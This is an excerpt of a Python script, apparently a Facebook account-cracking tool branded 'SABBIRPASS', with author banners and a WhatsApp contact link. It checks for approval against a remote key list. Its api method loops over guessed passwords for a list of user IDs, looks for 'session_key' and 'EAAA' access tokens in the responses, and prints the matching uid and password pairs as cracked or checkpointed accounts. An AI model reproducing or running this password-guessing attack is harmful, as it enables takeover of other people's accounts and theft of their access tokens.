...
def helpnote():
	...
	exit(" [*] FACEBOOK :  https://www.facebook.com/SABBIR.VAU.THE.KING")
...
def notice():
	...
	runtxt("\033[0;92m SABBIRPASS ADMIN MESSENGER >> os.system('xdg-open https://wa.me/+8801952370857")
	subprocess.check_output(["am", "start", "https://wa.me/+8801952370857"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/MrNana/approval/main/approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : SABBIR HASAN   
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mTools Owner : Mr-Black-Devil
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : MrNana
\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : SABBIRPASS 
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[SABBIR] : %s/%s -> \033[0;92m [ SABBIR-OK:%s ]- \033[0;91m[SABBIR-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\r  \033[0;91m   [SABBIR-CP] %s | %s\033[0;97m         "%(uid, pw))
